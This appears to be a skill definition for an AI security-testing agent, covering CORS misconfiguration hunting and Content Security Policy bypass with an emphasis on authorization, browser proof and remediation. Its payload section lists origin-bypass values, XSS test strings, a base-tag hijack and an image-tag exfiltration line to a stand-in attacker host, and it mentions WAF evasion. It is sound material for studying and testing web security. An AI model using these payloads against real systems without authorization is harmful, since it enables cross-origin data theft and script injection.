---
name: cors
description: "Canonical CORS capability: origin reflection, null-origin trust, subdomain-regex bypass, preflight (OPTIONS) gating, postMessage origin checks, and CSP bypass techniques. Consolidates 3 sub-skills: hunt-cors, testing-cors-misconfiguration, performing-content-security-policy-bypass. Use when hunting or validating CORS/CSP-related vulnerabilities."
sources: consolidated
report_count: 19
---

# CORS — Canonical Capability

## 1. Identity and purpose

This is the single primary executable capability for Cross-Origin Resource Sharing (CORS) misconfiguration testing and Content Security Policy (CSP) bypass analysis. It consolidates 3 previously separate sub-skills into one operational entry point while preserving all source content in `references/` and the original sub-skill directories for rollback.

Primary objectives:
- Discover endpoints that emit `Access-Control-*` headers and evaluate origin validation.
- Prove credentialed cross-origin reads of sensitive data in a real browser.
- Identify null-origin trust, subdomain-regex bypasses, insecure (HTTP) trusted origins, and preflight gating weaknesses.
- Audit postMessage handlers for missing or loose origin checks.
- Bypass or assess CSP configurations that gate XSS/script execution and data exfiltration.
- Produce reproducible, impact-rated findings with remediation guidance.

## 2. Scope

In scope:
- CORS misconfiguration: origin reflection with credentials, wildcard misuse, null-origin trust, subdomain/trusted-origin regex bypass, prefix/suffix/anchor flaws, insecure-protocol trusted origins, preflight (OPTIONS) gating and method/header authorization, postMessage origin checks.
- CSP analysis and bypass: unsafe-inline/unsafe-eval, whitelisted JSONP/library endpoints, base-uri and form-action gaps, nonce/hash leakage, policy injection, report-only mode, and data exfiltration without script-src.
- Endpoints: `/api/*`, `/v1/*`, `/graphql`, profile/account, tokens/keys, financial, admin/internal surfaces.

Out of scope (hand off):
- Non-executable markup reflection -> `hunt-html-injection` (escalate to XSS once script execution is possible).
- Pure XSS discovery without CSP gating -> `xss` capability; use this capability when CSP blocks execution.
- TLS/network-layer cleartext-origin abuse beyond CORS -> network capabilities (pair with TLS testing).
- Subdomain takeover execution details -> `hunt-subdomain` capability (chain here once a trusted origin is controlled).

## 3. Invocation and routing

Use this capability when:
- A target emits `Access-Control-Allow-Origin` / `Access-Control-Allow-Credentials` headers.
- You need to test whether an attacker-controlled origin can read authenticated cross-origin response bodies.
- A regex or allowlist validates the `Origin` header and may be bypassable.
- You are assessing preflight (OPTIONS) behavior for dangerous methods/headers or caching.
- You are auditing postMessage handlers for origin validation.
- XSS is found but blocked by CSP, or you are auditing CSP header configuration.

Routing notes:
- Start with `references/hunt-cors.md` for hunting methodology and browser proof requirements.
- Use `references/testing-cors-misconfiguration.md` for step-by-step testing, PoC construction, and reporting templates.
- Use `references/performing-content-security-policy-bypass.md` for CSP analysis and bypass techniques.
- Chain to `hunt-subdomain` for dangling trusted subdomains, `hunt-dom` for postMessage exploitation depth, and `hunt-csrf` when a stolen CSRF token enables state change.

## 4. Inputs and outputs

Inputs:
- Target base URLs, API endpoints, and request templates.
- Session cookies / authentication material for credentialed tests.
- Optional: Burp Suite project, browser automation, attacker-controlled origin/host, wordlists, OOB (Collaborator/oastify) endpoint.

Outputs:
- Confirmed or refuted CORS/CSP findings with browser-execution proof.
- Origin validation matrix (tested origins vs reflected/credentials).
- Preflight authorization results and cache observations.
- CSP policy analysis and bypass inventory.
- Reproduction steps, impact assessment, and remediation guidance.
- False-positive rulings with disproof rationale.

## 5. Preconditions and authorization

- Confirm written authorization and scope before testing; include API hosts, origins, and test accounts.
- Use only test accounts and non-production data unless explicitly authorized.
- Respect rate limits and avoid destructive operations on shared resources.
- Do not access other users' data beyond proof of control.
- Host PoC pages only on attacker infrastructure you control; do not leave exfiltration endpoints collecting real user data.
- Document any out-of-scope endpoint discovered and hand off rather than exploit.

## 6. Reconnaissance

Recon steps:
1. Collect endpoints from OpenAPI/Swagger, Postman collections, JS bundles, source maps, mobile traffic, and proxy logs; grep for `api`, `v1`, `graphql`, `token`, `profile`, `balance`.
2. Probe API versions and paths: `/v0/`, `/v1/`, `/v1.1/`, `/beta/`, `/internal/`, `/admin/`, `/debug/`, plus alternate content types (`.json`, `.xml`, `.yaml`).
3. Identify session/auth mechanisms and role/tenant boundaries.
4. Detect CORS-emitting endpoints by sending `Origin: https://evil.com` and grepping `access-control`.
5. Fingerprint framework/gateway to select framework-specific references when applicable.
6. Harvest postMessage handlers from JS bundles (`addEventListener("message"`) and audit origin checks.

See `references/hunt-cors.md` (Attack Surface Signals, Phase 1) and `references/testing-cors-misconfiguration.md` (Step 1).

## 7. Detection methodology

Core detection flow:
1. Discover CORS-emitting endpoints and record baseline headers for each.
2. Test arbitrary origin reflection (`https://evil.com`) and null origin with credentials.
3. Classify subdomain/trusted-origin regex flaws and send the matching bypass origin (Phase 3 table).
4. Test trusted insecure (HTTP) origins for MITM-readable authed bodies.
5. Test preflight (OPTIONS) for arbitrary method/header authorization and server-side enforcement.
6. Prove every candidate with a real browser PoC (reflect-any-origin, null-origin, or trusted-subdomain read).
7. Audit postMessage handlers for missing/loose origin checks.
8. For CSP: extract policy, run CSP Evaluator, test unsafe-inline/eval, JSONP/library gadgets, base-uri/form-action, nonce/hash leakage, policy injection, and exfiltration without script-src.
9. Validate each candidate with a second independent request/account and mark refuted if not proven.

References by phase:
- Hunting: `references/hunt-cors.md`.
- Testing/PoC/reporting: `references/testing-cors-misconfiguration.md`.
- CSP: `references/performing-content-security-policy-bypass.md`.

## 8. Technique selection

Select techniques by observed behavior:
- Unknown surface -> endpoint discovery + CORS header probing + JS harvesting.
- Arbitrary origin reflected + credentials -> reflect-any-origin browser read PoC (High if sensitive body).
- `ACAO: null` + credentials -> null-origin sandbox iframe PoC.
- Trusted-origin regex -> identify flaw class first (missing dot/anchor/unescaped dot/prefix-only), then send matching payload.
- Trusted insecure (HTTP) origin -> MITM page read (pair with TLS/network testing).
- Preflight reflects arbitrary methods/headers -> drive authed state-changing requests from attacker origin.
- postMessage no/loose origin check -> DOM-side exploitation (see hunt-dom).
- CSP blocks XSS -> evaluate policy weaknesses (JSONP/library, base-uri, nonce leakage, report-only) and exfiltration channels.
- Wildcard-only (`ACAO: *`) without credentials -> usually Informational/Low unless data is sensitive unauthenticated.

## 9. Execution steps

1. Establish a baseline request per endpoint (method, headers, body, auth) and record `Access-Control-*` values.
2. Replay with one controlled change at a time (Origin variants); record status, headers, body, timing.
3. Use the Phase 3 regex table to choose the correct bypass origin; do not guess.
4. Test preflight (OPTIONS) separately from real requests; never assume preflight equals real-request behavior.
5. Prove with a real browser PoC; curl alone is insufficient because curl does not enforce CORS.
6. For null origin, use a sandboxed iframe (`sandbox="allow-scripts"` without `allow-same-origin`).
7. For CSP, extract the policy, analyze directives, and test bypass techniques in order: unsafe-inline/eval -> JSONP/library gadgets -> base-uri/form-action -> nonce/hash leakage -> policy injection -> exfiltration channels.
8. Confirm exploitability with a clean reproduction (hosted PoC + screenshot/console/OOB hit).
9. Stop and document when a vector is not exploitable or out of scope.

## 10. Tool usage

- Proxy: Burp Suite (Repeater, Intruder, Comparer, Logger++, DOM Invader).
- Scanners (triage only): CORSy, CORScanner, nuclei CORS templates, OWASP ZAP, CSP Evaluator.
- Discovery: ffuf, httpx, KiteRunner, dirsearch, subfinder.
- Browser: Chrome/Firefox DevTools, sandboxed iframe PoCs, attacker web server.
- CSP: Google CSP Evaluator, RetireJS, csp-bypass technique lists.
- Automation: Python requests/httpx, curl, jq.
- Evidence: screenshots, saved requests/responses, canary values, OOB interactions.

See `references/hunt-cors.md` (Automation), `references/testing-cors-misconfiguration.md` (Tools & Systems), and `references/performing-content-security-policy-bypass.md` (Tools & Systems).

## 11. Payloads and test cases

Representative test cases (adapt to target):
- Arbitrary origin: `Origin: https://evil.com` -> expect reflected ACAO + ACAC:true for High.
- Null origin: `Origin: null` -> expect `ACAO: null` + ACAC:true.
- Subdomain bypass origins: `https://eviltarget.com`, `https://x.target.com.evil.com`, `https://target.com.evil.com`, `https://target.com%60.evil.com`, `http://sub.target`.
- Regex flaw matrix: missing dot separator, missing end anchor, unescaped dot, prefix-only.
- Preflight: `OPTIONS` with `Access-Control-Request-Method: PUT/DELETE` and custom headers; inspect `Access-Control-Allow-Methods/Headers/Max-Age`.
- postMessage: handlers missing `.origin` checks; weak `indexOf`/`endsWith`/`startsWith` checks.
- CSP unsafe-inline: `<script>alert(document.domain)</script>`, `<img src=x onerror="alert(1)">`.
- CSP unsafe-eval: `eval('alert(1)')`, `setTimeout('alert(1)',0)`, `new Function('alert(1)')()`.
- JSONP gadget: load whitelisted library/endpoint with callback `alert(1)`.
- base-uri hijacking: `<base href="https://attacker.com/">`.
- Exfiltration without script-src: `<img src="https://attacker.com/steal?data=...">`, CSS attribute selectors, DNS prefetch.

Framework and variant details live in the corresponding references.

## 12. Evidence

Each finding must include:
- Exact request and response (raw HTTP or browser network capture).
- Authentication context and account/role used.
- Origin tested and whether it was reflected with credentials.
- Browser proof: screenshot/console/OOB interaction showing the authed body read (or CSP bypass execution).
- For regex bypass: the specific flaw class and matching payload.
- For preflight: authorized methods/headers and cache duration.
- For CSP: policy, directive analysis, bypass technique, and payload.
- Impact assessment and affected data scope.

## 13. Reproduction and validation

- Reproduce with a hosted PoC page in a real browser while logged into the target.
- Validate with a second origin/account where applicable.
- Confirm the browser actually allows the read; a curl-reflected header is not proof.
- For null origin, confirm the sandboxed iframe emits `Origin: null`.
- For CSP, confirm execution/exfiltration in a browser with the policy enforced (not report-only).
- Mark as refuted if the fetch throws / logs `BLOCKED`, or execution cannot be demonstrated.

## 14. False-positive rejection

Reject or downgrade when:
- `ACAO: *` is present but credentials are not allowed/readable (browser blocks it).
- `ACAC: true` is present but your origin is not reflected or the read fails.
- A reflected origin is not attacker-controllable (e.g., `evil.target.com` without takeover).
- The regex is correctly escaped and anchored; your payload does not actually match.
- Preflight result differs from real-request behavior; the read path is not actually open.
- CSP is report-only only? Note: report-only means not enforced, so XSS works directly; this is a real finding but classify as misconfiguration, not bypass.
- A whitelisted JSONP endpoint does not actually execute attacker-controlled callbacks.
- Response differences are due to caching, localization, or benign metadata.
- Framework defaults or dev-only routes are not reachable in production.

## 15. Impact

Impact guidance:
- Critical: credentialed read of secrets/tokens enabling account takeover or payment manipulation; subdomain-takeover/XSS-assisted credentialed read of sensitive data.
- High: reflect-any-origin + credentials + sensitive body (PII/tokens/CSRF); preflight authorizes attacker-origin state change on sensitive action.
- Medium: null-origin + sensitive authed body; CSP bypass leading to XSS on sensitive application.
- Low: origin reflection without credentials or on non-sensitive data; information disclosure.
- Informational: `ACAO: *` only with no credentials possible, unless data is secret unauthenticated.

Always tie impact to business risk and data scope; avoid severity inflation from header presence alone.

## 16. Reporting

Report template:
- Summary: endpoint, vulnerability type, origin condition, impact.
- Scope/authorization: test accounts, test window, attacker origin.
- Steps to reproduce: numbered, minimal; include PoC host location.
- Proof of concept: hosted HTML + screenshot/console/OOB hit.
- Origin validation matrix and regex flaw class.
- Preflight results and cache duration.
- CSP policy analysis and bypass details (if applicable).
- Impact: business and data scope.
- Remediation: strict origin allowlist with exact string matching; reject null; escape/anchor regexes; require HTTPS trusted origins; restrict methods/headers; reasonable max-age; CSP hardening (remove unsafe-inline/eval, strict nonces/hashes, strict-dynamic, base-uri 'self', object-src 'none', frame-ancestors).

## 17. Failure modes

- Surface not fully discovered -> expand recon, check mobile/SPA, versions, content types.
- No test account -> request credentials or scope clarification; do not bypass without authorization.
- WAF/gateway blocks payloads -> try content-type confusion, encoding, version downgrade, or parser differentials.
- Rate limiting stops testing -> coordinate throttling, use allowed test windows, or hand off.
- Browser blocks the read -> re-evaluate `ACAO: *` + creds case; likely not a finding.
- Regex class unclear -> test all classes systematically and record server responses.
- CSP bypass inconclusive -> verify policy is enforced (not report-only) and test in a clean browser profile.
- Inconclusive authorization/origin result -> repeat with fresh sessions and diff responses; mark as not confirmed if ambiguous.

## 18. References

All 3 sub-skill references are preserved and must resolve:

| Reference | Sub-capability | Load when |
|---|---|---|
| `references/hunt-cors.md` | `hunt-cors` | Hunting methodology, regex bypass classes, browser PoCs |
| `references/testing-cors-misconfiguration.md` | `testing-cors-misconfiguration` | Step-by-step testing, PoC construction, reporting |
| `references/performing-content-security-policy-bypass.md` | `performing-content-security-policy-bypass` | CSP analysis and bypass techniques |

Original sub-skills remain intact under `hunt-cors/`, `testing-cors-misconfiguration/`, and `performing-content-security-policy-bypass/`.

## 19. Testing and mastery

- Validate with the capability tests in `tests/test_cors_capability.py`.
- Confirm all referenced files resolve and are non-empty.
- Confirm migration map paths/hashes/status are accurate.
- Practice on authorized labs: PortSwigger CORS labs, OWASP crAPI, and CSP bypass challenges.
- Mastery criteria: independently discover, browser-prove, and report a CORS or CSP finding with full reproduction, impact, and remediation.


## Knowledge sources

- WKS bug classes: cors
- Domain knowledge: cors
- WKS remains the structured source of truth; retrieve and validate items through WKS rather than duplicating the full corpus in this skill.
- Research and learning material is mapped in `stage-a/knowledge-source-map.json` and must be validated before promotion.
